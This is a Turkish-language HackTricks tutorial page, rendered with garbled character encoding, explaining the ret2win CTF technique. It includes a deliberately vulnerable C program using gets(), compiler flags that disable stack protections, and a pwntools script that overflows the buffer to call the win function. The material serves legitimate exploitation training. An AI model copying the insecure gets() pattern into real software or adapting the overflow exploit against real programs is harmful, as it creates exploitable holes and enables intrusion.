# Ret2win

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

**Ret2win** zorluklarÄ±, Ã¶zellikle **binary exploitation** iÃ§eren gÃ¶revlerde, **Capture The Flag (CTF)** yarÄ±ÅŸmalarÄ±nda popÃ¼ler bir kategoridir. AmaÃ§, verilen bir binary'deki bir zafiyeti sÃ¶mÃ¼rerek, genellikle `win`, `flag` vb. adlarla adlandÄ±rÄ±lan belirli bir Ã§aÄŸrÄ±lmamÄ±ÅŸ iÅŸlevi yÃ¼rÃ¼tmektir. Bu iÅŸlev, Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda genellikle bir bayrak veya baÅŸarÄ± mesajÄ± yazdÄ±rÄ±r. Genellikle, istenen iÅŸleve yÃ¼rÃ¼tme akÄ±ÅŸÄ±nÄ± yÃ¶nlendirmek iÃ§in **stack** Ã¼zerindeki **dÃ¶nÃ¼ÅŸ adresini** deÄŸiÅŸtirerek bir zafiyeti sÃ¶mÃ¼rmeyi iÃ§erir. Ä°ÅŸte Ã¶rneklerle daha detaylÄ± bir aÃ§Ä±klama:

### C Ã–rneÄŸi

Zafiyeti olan basit bir C programÄ± ve Ã§aÄŸÄ±rmayÄ± amaÃ§ladÄ±ÄŸÄ±mÄ±z bir `win` iÅŸlevi dÃ¼ÅŸÃ¼nÃ¼n:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Bu programÄ± yÄ±ÄŸÄ±n korumalarÄ± olmadan ve **ASLR** devre dÄ±ÅŸÄ± bÄ±rakÄ±larak derlemek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: ProgramÄ± 32 bitlik bir ikili olarak derler (bu isteÄŸe baÄŸlÄ±dÄ±r ancak CTF zorluklarÄ±nda yaygÄ±ndÄ±r).
* `-fno-stack-protector`: Stack overflow'lara karÅŸÄ± korumalarÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±r.
* `-z execstack`: Stack Ã¼zerinde kodun Ã§alÄ±ÅŸmasÄ±na izin verir.
* `-no-pie`: Adresin `win` fonksiyonunun deÄŸiÅŸmediÄŸinden emin olmak iÃ§in Konum BaÄŸÄ±msÄ±z YÃ¼rÃ¼tÃ¼lebilir'i devre dÄ±ÅŸÄ± bÄ±rakÄ±r.
* `-o vulnerable`: Ã‡Ä±kÄ±ÅŸ dosyasÄ±nÄ± `vulnerable` olarak adlandÄ±rÄ±r.

### Pwntools Kullanarak Python SÄ±zma

SÄ±zma iÃ§in gÃ¼Ã§lÃ¼ bir CTF Ã§erÃ§evesi olan **pwntools** kullanacaÄŸÄ±z. SÄ±zma betiÄŸi, tamponu taÅŸÄ±rarak ve dÃ¶nÃ¼ÅŸ adresini `win` fonksiyonunun adresiyle deÄŸiÅŸtirerek bir saldÄ±rÄ± yÃ¼kÃ¼ oluÅŸturacaktÄ±r.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
`win` fonksiyonunun adresini bulmak iÃ§in **gdb**, **objdump** veya binary dosyalarÄ± incelemenize izin veren diÄŸer araÃ§larÄ± kullanabilirsiniz. Ã–rneÄŸin, `objdump` ile ÅŸunu kullanabilirsiniz:
```sh
objdump -d vulnerable | grep win
```
Bu komut, `win` fonksiyonunun montajÄ±nÄ± ve baÅŸlangÄ±Ã§ adresini gÃ¶sterecektir.

Python betiÄŸi, `vulnerable_function` tarafÄ±ndan iÅŸlendiÄŸinde, tamamen oluÅŸturulmuÅŸ bir ileti gÃ¶nderir ve tamponu taÅŸÄ±rarak yÄ±ÄŸÄ±n Ã¼zerindeki dÃ¶nÃ¼ÅŸ adresini `win` adresiyle Ã¼zer yazar. `vulnerable_function` geri dÃ¶ndÃ¼ÄŸÃ¼nde, `main`e dÃ¶nmemek veya Ã§Ä±kmamak yerine `win`e atlar ve ileti yazdÄ±rÄ±lÄ±r.

## Korumalar

* Adresin gÃ¼venilir olmasÄ± iÃ§in [**PIE**](../../common-binary-protections-and-bypasses/pie/) **devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ±dÄ±r** veya iÅŸlevin depolanacaÄŸÄ± adres her zaman aynÄ± olmayacak ve `win` fonksiyonunun nerede yÃ¼klendiÄŸini belirlemek iÃ§in sÄ±zÄ±ntÄ±ya ihtiyacÄ±nÄ±z olacaktÄ±r. BazÄ± durumlarda, taÅŸmayÄ± tetikleyen iÅŸlev `read` veya benzeri olduÄŸunda, dÃ¶nÃ¼ÅŸ adresini `win` fonksiyonu olacak ÅŸekilde deÄŸiÅŸtirmek iÃ§in 1 veya 2 baytlÄ±k bir **KÄ±smi Ãœzerine Yazma** yapabilirsiniz. ASLR'nin Ã§alÄ±ÅŸma ÅŸeklinden dolayÄ±, son Ã¼Ã§ onaltÄ±lÄ±k hane rastgele deÄŸil, bu yÃ¼zden doÄŸru dÃ¶nÃ¼ÅŸ adresini almak iÃ§in **1/16 ÅŸans** (1 onaltÄ±lÄ±k) vardÄ±r.
* [**YÄ±ÄŸÄ±n KanaryalarÄ±**](../../common-binary-protections-and-bypasses/stack-canaries/) da devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ±dÄ±r veya tehlikeye atÄ±lan EIP dÃ¶nÃ¼ÅŸ adresi asla takip edilmeyecektir.

## DiÄŸer Ã¶rnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32 bit, ASLR yok
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 bit, ASLR ile, bin adresinin sÄ±zÄ±ntÄ±sÄ± ile
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 bit, ASLR yok
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 bit, ASLR yok, Ã§ift kÃ¼Ã§Ã¼k taÅŸma, Ã¶nce yÄ±ÄŸÄ±nÄ± taÅŸmak ve ikinci taÅŸmanÄ±n boyutunu geniÅŸletmek iÃ§in
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bit, relro, kanarya yok, nx, pie yok, `fflush` adresini `win` fonksiyonuyla (ret2win) Ã¼zerine yazmak iÃ§in format dizesi
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html)
* 32 bit, nx, baÅŸka bir ÅŸey yok, EIP'nin (1 Bayt) kÄ±smi Ã¼zerine yazÄ±lmasÄ±yla win fonksiyonunu Ã§aÄŸÄ±rmak
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html)
* 32 bit, nx, baÅŸka bir ÅŸey yok, EIP'nin (1 Bayt) kÄ±smi Ã¼zerine yazÄ±lmasÄ±yla win fonksiyonunu Ã§aÄŸÄ±rmak
* [https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html](https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html)
* Program, giriÅŸin boyutunu kontrol etmek iÃ§in bir numaranÄ±n son baytÄ±nÄ± doÄŸruluyor, bu nedenle son baytÄ±n izin verilen aralÄ±k iÃ§inde olmasÄ± koÅŸuluyla herhangi bir boyut eklemek mÃ¼mkÃ¼ndÃ¼r. ArdÄ±ndan, giriÅŸ, bir ret2win ile istismar edilen bir tampon taÅŸmasÄ± oluÅŸturur.
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64 bit, relro, kanarya yok, nx, pie. Win fonksiyonunu (ret2win) Ã§aÄŸÄ±rmak iÃ§in kÄ±smi Ã¼zerine yazma
* [https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/](https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/)
* arm64, PIE, win fonksiyonunun aslÄ±nda 2 iÅŸlev olduÄŸu iÃ§in ROP cihazÄ±, 2 iÅŸlevi Ã§aÄŸÄ±ran ROP cihazÄ± saÄŸlar
* [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/)
* ARM64, bir win fonksiyonunu Ã§aÄŸÄ±rmak iÃ§in bir eksik bir taÅŸma kullanÄ±mÄ±

## ARM64 Ã–rneÄŸi

{% content-ref url="ret2win-arm64.md" %}
[ret2win-arm64.md](ret2win-arm64.md)
{% endcontent-ref %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek **paylaÅŸÄ±n**.

</details>
